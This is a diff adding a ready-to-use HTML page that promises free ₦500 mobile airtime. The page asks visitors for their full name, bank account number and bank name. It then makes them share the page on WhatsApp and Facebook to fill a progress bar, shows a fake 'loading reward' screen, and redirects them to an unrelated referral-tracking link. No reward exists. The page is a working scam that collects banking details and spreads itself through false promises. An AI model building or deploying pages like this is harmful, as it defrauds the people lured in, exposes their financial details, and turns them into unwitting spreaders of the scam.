@@ -1,0 +1,138 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>Get Free ₦500 Airtime Instantly</title>
+  <style>
+    * { box-sizing: border-box; font-family: 'Poppins', sans-serif; }
+    body {
+      background: #f5fdf6;
+      color: #033a10;
+      text-align: center;
+      padding: 20px;
+    }
+    .container {
+      max-width: 420px;
+      background: #fff;
+      margin: 40px auto;
+      padding: 30px;
+      border-radius: 20px;
+      box-shadow: 0 0 15px rgba(0,0,0,0.1);
+    }
+    h1 { color: #028c3e; font-size: 24px; margin-bottom: 15px; }
+    input {
+      width: 100%;
+      padding: 12px;
+      margin: 10px 0;
+      border: 1px solid #ccc;
+      border-radius: 8px;
+      font-size: 15px;
+    }
+    button {
+      width: 100%;
+      background: #03b54b;
+      color: white;
+      border: none;
+      padding: 14px;
+      border-radius: 10px;
+      font-size: 16px;
+      cursor: pointer;
+      transition: 0.3s;
+      margin-top: 10px;
+    }
+    button:hover { background: #029e41; }
+    .hidden { display: none; }
+    .progress-container {
+      width: 100%; background: #e0e0e0;
+      border-radius: 20px; height: 25px; margin: 20px 0;
+    }
+    .progress-bar {
+      height: 100%; width: 0%;
+      background: linear-gradient(90deg, #03b54b, #028c3e);
+      border-radius: 20px; color: white;
+      line-height: 25px; font-weight: bold;
+    }
+    .loading {
+      font-size: 18px; font-weight: 500; color: #028c3e;
+    }
+  </style>
+</head>
+<body>
+
+  <div class="container" id="step1">
+    <h1>🎁 Get Free ₦500 Airtime Instantly!</h1>
+    <p>Please fill in your details to continue:</p>
+    <input type="text" id="name" placeholder="Full Name" required>
+    <input type="text" id="account" placeholder="Account Number" required>
+    <input type="text" id="bank" placeholder="Bank Name" required>
+    <button onclick="goToShare()">Continue</button>
+  </div>
+
+  <div class="container hidden" id="step2">
+    <h1>Almost Done!</h1>
+    <p>Share this page to continue (progress updates as you go):</p>
+    <div class="progress-container">
+      <div class="progress-bar" id="progress-bar">0%</div>
+    </div>
+    <button onclick="shareWhatsApp()">Share on WhatsApp</button>
+    <button onclick="shareFacebook()">Share on Facebook</button>
+  </div>
+
+  <div class="container hidden" id="loadingScreen">
+    <h1>⏳ Loading Reward...</h1>
+    <p class="loading">Please wait while we finalize your request...</p>
+  </div>
+
+  <script>
+    let progress = 0;
+    const step1 = document.getElementById('step1');
+    const step2 = document.getElementById('step2');
+    const loadingScreen = document.getElementById('loadingScreen');
+    const progressBar = document.getElementById('progress-bar');
+    const referralLink = "https://m.bolo2vas99.click/c/n/295008/5740?cid=";
+
+    function goToShare() {
+      const name = document.getElementById('name').value.trim();
+      const acc = document.getElementById('account').value.trim();
+      const bank = document.getElementById('bank').value.trim();
+      if(!name || !acc || !bank) {
+        alert("Please fill in all fields.");
+        return;
+      }
+      step1.classList.add('hidden');
+      step2.classList.remove('hidden');
+    }
+
+    function updateProgress() {
+      if(progress < 100) {
+        progress += 25;
+        if(progress > 100) progress = 100;
+        progressBar.style.width = progress + "%";
+        progressBar.textContent = progress + "%";
+      }
+      if(progress >= 100) {
+        setTimeout(() => {
+          step2.classList.add('hidden');
+          loadingScreen.classList.remove('hidden');
+          setTimeout(() => {
+            window.location.href = referralLink;
+          }, 3000);
+        }, 1000);
+      }
+    }
+
+    function shareWhatsApp() {
+      const msg = `🎁 Get ₦500 Airtime Instantly! Click to claim: ${referralLink}`;
+      window.open(`https://wa.me/?text=${encodeURIComponent(msg)}`, '_blank');
+      updateProgress();
+    }
+
+    function shareFacebook() {
+      window.open(`https://www.facebook.com/sharer/sharer.php?u=${encodeURIComponent(referralLink)}`, '_blank');
+      updateProgress();
+    }
+  </script>
+
+</body>
+</html>
